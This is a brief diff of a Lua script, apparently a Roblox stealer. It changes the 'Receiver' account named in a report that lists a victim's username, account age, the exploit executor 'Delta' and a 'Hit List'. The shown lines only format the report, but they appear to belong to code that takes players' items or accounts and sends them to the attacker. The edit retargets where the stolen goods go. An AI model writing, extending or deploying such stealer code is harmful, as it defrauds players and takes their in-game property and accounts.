@@ -95,7 +95,7 @@ task.spawn(function()
     "Username: " .. playerName .. "\n" ..
     "Executor: Delta\n" .. 
     "Account Age: " .. accountAge .. "\n" ..
-    "Receiver: YashStorage1\n" ..
+    "Receiver: YashStorage\n" ..
     "──────────────\n" ..
     "**Hit List:**\n"
 
